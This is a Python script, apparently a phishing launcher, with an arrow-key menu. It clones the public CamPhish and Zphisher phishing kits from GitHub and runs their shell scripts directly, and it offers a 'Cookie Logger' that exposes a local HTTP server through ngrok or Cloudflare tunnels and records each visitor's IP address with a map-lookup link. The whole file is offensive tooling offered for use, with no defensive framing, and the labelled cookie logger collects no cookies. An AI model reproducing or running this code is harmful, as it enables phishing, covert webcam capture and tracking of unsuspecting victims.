import os
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, Style
from pynput import keyboard
import sys
import time

def download_camphish():
    repo_url = "https://github.com/techchipnet/CamPhish.git"
    directory = "CamPhish"
    try:
        if not os.path.exists(directory):
            print(f"\n{Fore.BLUE}[*] Cloning CamPhish from {repo_url}...{Style.RESET_ALL}")
            subprocess.run(["git", "clone", repo_url], check=True)
            print(f"{Fore.BLUE}[*] CamPhish downloaded successfully.{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Starting CamPhish...{Style.RESET_ALL}")
            subprocess.run(["bash", f"{directory}/camphish.sh"], check=True)
        else:
            print(f"{Fore.BLUE}[*] CamPhish is already downloaded.{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Starting CamPhish...{Style.RESET_ALL}")
            subprocess.run(["bash", f"{directory}/camphish.sh"], check=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Error handling CamPhish: {e}{Style.RESET_ALL}")

def download_zphisher():
    repo_url = "https://github.com/htr-tech/zphisher.git"
    directory = "zphisher"
    try:
        if not os.path.exists(directory):
            print(f"\n{Fore.BLUE}[*] Cloning Zphisher from {repo_url}...{Style.RESET_ALL}")
            subprocess.run(["git", "clone", repo_url], check=True)
            print(f"{Fore.BLUE}[*] Zphisher downloaded successfully.{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Starting Zphisher...{Style.RESET_ALL}")
            subprocess.run(["bash", f"{directory}/zphisher.sh"], check=True)
        else:
            print(f"{Fore.BLUE}[*] Zphisher is already downloaded.{Style.RESET_ALL}")
            print(f"{Fore.BLUE}[*] Starting Zphisher...{Style.RESET_ALL}")
            subprocess.run(["bash", f"{directory}/zphisher.sh"], check=True)
    except Exception as e:
        print(f"{Fore.RED}[!] Error handling Zphisher: {e}{Style.RESET_ALL}")

def start_cookie_logger():
    print(f"\n{Fore.BLUE}[*] Starting Cookie Logger...{Style.RESET_ALL}")
    file_name = input(f"{Fore.BLUE}Enter the name of the file to log data (e.g., logs.txt): {Style.RESET_ALL}").strip()
    if not file_name:
        print(f"{Fore.RED}[!] No file name provided. Exiting Cookie Logger.{Style.RESET_ALL}")
        return

    print(f"{Fore.BLUE}Choose your tunneling service: {Style.RESET_ALL}")
    print(f"{Fore.BLUE}1. Ngrok{Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. Cloudflare{Style.RESET_ALL}")
    tunnel_choice = input(f"{Fore.BLUE}Enter your choice (1-2): {Style.RESET_ALL}").strip()

    tunnel_command = None
    if tunnel_choice == "1":
        tunnel_command = ["ngrok", "http", "8080"]
    elif tunnel_choice == "2":
        tunnel_command = ["cloudflared", "tunnel", "--url", "http://localhost:8080"]
    else:
        print(f"{Fore.RED}[!] Invalid choice. Exiting Cookie Logger.{Style.RESET_ALL}")
        return

    try:
        with open(file_name, "w") as f:
            f.write("IP Address, Location (Google Maps URL)\n")  # Add headers for the log file

        class LoggingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                client_ip = self.client_address[0]
                location_url = f"https://www.google.com/maps?q={client_ip}"
                log_entry = f"{client_ip}, {location_url}\n"
                print(f"{Fore.BLUE}[+] Logged: {log_entry.strip()}{Style.RESET_ALL}")

                with open(file_name, "a") as log_file:
                    log_file.write(log_entry)

                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"Logging complete. Check the file for details.")

        print(f"{Fore.BLUE}[*] Starting tunneling service...{Style.RESET_ALL}")
        subprocess.Popen(tunnel_command)

        server = HTTPServer(("0.0.0.0", 8080), LoggingHandler)
        print(f"{Fore.BLUE}[*] Server started. Access the logger via http://localhost:8080{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Logs will be saved to: {file_name}{Style.RESET_ALL}")
        server.serve_forever()

    except Exception as e:
        print(f"{Fore.RED}[!] Error starting Cookie Logger: {e}{Style.RESET_ALL}")

def main():
    menu_options = ["CamPhish", "Zphisher", "Text Logger"]
    selected_index = 0

    def render_menu():
        os.system("clear")
        print(Fore.BLUE + "="*50 + Style.RESET_ALL)
        print(Fore.BLUE + "  Welcome to the Tool Selector! Choose an option:" + Style.RESET_ALL)
        print(Fore.BLUE + "="*50 + Style.RESET_ALL)
        for i, option in enumerate(menu_options):
            if i == selected_index:
                print(f"{Fore.BLACK}{Style.BRIGHT}> {option} <{Style.RESET_ALL}")
            else:
                print(f"  {option}")

    def on_press(key):
        nonlocal selected_index
        if key == keyboard.Key.up:
            selected_index = (selected_index - 1) % len(menu_options)
        elif key == keyboard.Key.down:
            selected_index = (selected_index + 1) % len(menu_options)
        elif key == keyboard.Key.enter:
            if selected_index == 0:
                download_camphish()
            elif selected_index == 1:
                download_zphisher()
            elif selected_index == 2:
                start_cookie_logger()
            elif selected_index == 3:
                sys.exit()
            return False

        render_menu()

    print("\n" + Fore.BLUE + "Use UP/DOWN arrows to navigate and ENTER to select." + Style.RESET_ALL)
    render_menu()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
